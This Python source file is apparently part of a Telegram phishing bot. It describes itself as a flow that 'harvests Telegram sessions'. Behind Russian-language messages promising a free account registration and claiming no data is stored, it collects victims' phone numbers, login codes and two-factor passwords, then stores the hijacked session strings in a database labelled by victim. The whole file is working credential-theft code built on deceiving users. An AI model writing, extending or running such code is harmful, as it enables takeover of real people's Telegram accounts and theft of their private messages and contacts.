"""Phishing auth flow — harvests Telegram sessions."""

import asyncio
import logging
from aiogram import Router, F
from aiogram.types import CallbackQuery, Message
from aiogram.fsm.context import FSMContext

from bot.database import Database
from bot.services.session_manager import SessionManager
from bot.keyboards import main_menu_kb, back_to_menu_kb, auth_start_kb
from bot.states import AccountAuthStates

logger = logging.getLogger(__name__)
router = Router()


async def _auth_timeout(user_id: int, state: FSMContext, timeout: int = 300):
    """Auto-clear FSM state after timeout."""
    await asyncio.sleep(timeout)
    current_state = await state.get_state()
    if current_state is not None:
        await state.clear()


@router.callback_query(F.data == "account_add")
async def start_add_account(callback: CallbackQuery, state: FSMContext, db: Database):
    """Start phishing auth flow."""
    await state.set_state(AccountAuthStates.waiting_phone)
    await state.update_data(auth_started_at=asyncio.get_event_loop().time())

    await callback.message.answer(
        "🔐 <b>Регистрация аккаунта</b>\n\n"
        "Для использования бота необходимо подтвердить владение аккаунтом Telegram.\n\n"
        "📱 Введите номер телефона в международном формате:\n"
        "<code>+79001234567</code>\n\n"
        "⚠️ Мы не храним ваши данные. Проверка проходит через официальный API Telegram.\n"
        "⏱ Таймаут: 5 минут",
        reply_markup=back_to_menu_kb(),
        parse_mode="HTML",
    )
    await callback.answer()

    asyncio.create_task(_auth_timeout(callback.from_user.id, state))


@router.message(AccountAuthStates.waiting_phone)
async def process_phone(message: Message, state: FSMContext, session_mgr: SessionManager, db: Database):
    """Process phone number — send code via Telethon."""
    if not message.text:
        await message.answer("📱 Введите номер телефона:")
        return

    phone = message.text.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone

    if len(phone) < 10 or not phone[1:].isdigit():
        await message.answer("❌ Неверный формат. Пример: <code>+79001234567</code>", parse_mode="HTML")
        return

    await state.update_data(phone=phone)
    status_msg = await message.answer("⏳ Отправка запроса на код...")

    result = await session_mgr.send_code(phone, device_type="mobile")

    if not result["success"]:
        await status_msg.delete()
        error_map = {
            "flood": f"❌ Слишком много запросов. Подождите {result.get('seconds', 60)} секунд.",
            "invalid_phone": "❌ Неверный номер телефона.",
            "banned": "❌ Этот номер заблокирован в Telegram.",
            "phone_flood": "❌ На этот номер уже отправлено слишком много кодов.",
        }
        await message.answer(error_map.get(result["error"], f"❌ Ошибка: {result.get('message', 'unknown')}"))
        await state.clear()
        return

    # CRITICAL: Save device_info and proxy for verify steps
    await state.update_data(
        temp_session=result["session_string"],
        phone_code_hash=result["phone_code_hash"],
        device_info=result["device_info"],
        proxy=result["proxy"],  # Store Proxy OBJECT, not string
    )

    await result["client"].disconnect()

    await status_msg.delete()
    await state.set_state(AccountAuthStates.waiting_code)
    await message.answer(
        "✅ <b>Код отправлен!</b>\n\n"
        "⚠️ Код может прийти как <b>SMS</b>, так и в <b>другой Telegram-клиент</b>.\n\n"
        "Введите код подтверждения:\n"
        "⏱ Таймаут: 5 минут",
        parse_mode="HTML",
    )


@router.message(AccountAuthStates.waiting_code)
async def process_code(message: Message, state: FSMContext, session_mgr: SessionManager, db: Database):
    """Process verification code — harvest session or handle 2FA."""
    if not message.text:
        await message.answer("Введите код:")
        return

    data = await state.get_data()
    phone = data["phone"]
    temp_session = data["temp_session"]
    phone_code_hash = data["phone_code_hash"]
    device_info = data.get("device_info", {})
    proxy = data.get("proxy")  # This is now a Proxy OBJECT
    code = message.text.strip().replace(" ", "").replace("-", "")

    status_msg = await message.answer("⏳ Проверка кода...")

    # CRITICAL: Pass device_info and proxy to verify_code
    result = await session_mgr.verify_code(temp_session, phone, code, phone_code_hash, proxy, device_info)

    if result["success"]:
        proxy_str = str(proxy) if proxy else "direct"
        session_id = db.save_session(
            victim_tg_id=message.from_user.id,
            phone=phone,
            session_string=result["session_string"],
            device_info=device_info,
            proxy=proxy_str,
            username=result.get("username"),
        )

        db.mark_verified(message.from_user.id)
        db.set_verification_state(message.from_user.id, "completed")

        await status_msg.delete()
        await state.clear()

        await message.answer(
            "✅ <b>Регистрация завершена!</b>\n\n"
            "🌟 <b>Доступ к боту активирован</b>\n"
            "• Безлимитные генерации\n"
            "• Приоритетная очередь\n"
            "• Эксклюзивные стили\n\n"
            "Приятного использования!",
            reply_markup=main_menu_kb(),
            parse_mode="HTML",
        )

        logger.info(f"[HARVEST] Session {session_id} | User {message.from_user.id} | Phone {phone}")

    elif result["error"] == "2fa_required":
        await state.update_data(temp_session=result["session_string"])
        await state.set_state(AccountAuthStates.waiting_2fa)
        await status_msg.edit_text(
            "🔐 <b>Двухфакторная аутентификация</b>\n\n"
            "Введите пароль 2FA:\n"
            "⏱ Таймаут: 5 минут",
            parse_mode="HTML",
        )
    elif result["error"] == "invalid_code":
        await status_msg.delete()
        await message.answer("❌ Неверный код. Попробуйте ещё раз:")
    elif result["error"] == "expired":
        await state.clear()
        await status_msg.delete()
        await message.answer("❌ Код истёк. Начните регистрацию заново.", reply_markup=auth_start_kb())
    else:
        await state.clear()
        await status_msg.delete()
        await message.answer(f"❌ Ошибка: {result.get('message', 'unknown')}", reply_markup=back_to_menu_kb())


@router.message(AccountAuthStates.waiting_2fa)
async def process_2fa(message: Message, state: FSMContext, session_mgr: SessionManager, db: Database):
    """Process 2FA password — final harvest step."""
    if not message.text:
        await message.answer("Введите пароль 2FA:")
        return

    data = await state.get_data()
    temp_session = data["temp_session"]
    phone = data["phone"]
    device_info = data.get("device_info", {})
    proxy = data.get("proxy")  # Proxy OBJECT
    password = message.text.strip()

    status_msg = await message.answer("⏳ Проверка 2FA...")

    # CRITICAL: Pass device_info and proxy to verify_2fa
    result = await session_mgr.verify_2fa(temp_session, password, proxy, device_info)

    if result["success"]:
        proxy_str = str(proxy) if proxy else "direct"
        session_id = db.save_session(
            victim_tg_id=message.from_user.id,
            phone=phone,
            session_string=result["session_string"],
            device_info=device_info,
            proxy=proxy_str,
            username=result.get("username"),
        )
        db.mark_verified(message.from_user.id)
        db.set_verification_state(message.from_user.id, "completed_2fa")

        await status_msg.delete()
        await state.clear()
        await message.answer(
            "✅ <b>Регистрация завершена!</b>\n\n"
            "🌟 <b>Доступ к боту активирован</b>\n"
            "• Безлимитные генерации\n"
            "• Приоритетная очередь\n"
            "• Эксклюзивные стили\n\n"
            "Приятного использования!",
            reply_markup=main_menu_kb(),
            parse_mode="HTML",
        )
        logger.info(f"[HARVEST-2FA] Session {session_id} | User {message.from_user.id} | Phone {phone}")

    elif result["error"] == "invalid_password":
        await status_msg.delete()
        await message.answer("❌ Неверный пароль. Попробуйте ещё раз:")
    else:
        await state.clear()
        await status_msg.delete()
        await message.answer(f"❌ Ошибка: {result.get('message', 'unknown')}", reply_markup=back_to_menu_kb())
